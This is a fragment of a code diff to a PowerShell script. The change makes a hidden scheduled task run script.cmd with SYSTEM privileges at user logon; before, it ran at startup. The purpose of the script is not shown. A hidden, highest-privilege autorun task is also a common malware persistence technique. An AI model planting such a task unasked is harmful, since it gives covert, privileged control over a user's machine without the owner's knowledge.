@@ -27,10 +27,10 @@ catch {
     exit 1
 }
 
-# Create a scheduled task to run script.cmd at startup silently with administrator/SYSTEM privileges
+# Create a scheduled task to run script.cmd automatically upon user logon with SYSTEM privileges
 try {
     $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$outputFile`""
-    $trigger = New-ScheduledTaskTrigger -AtStartup
+    $trigger = New-ScheduledTaskTrigger -AtLogon
     $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
     
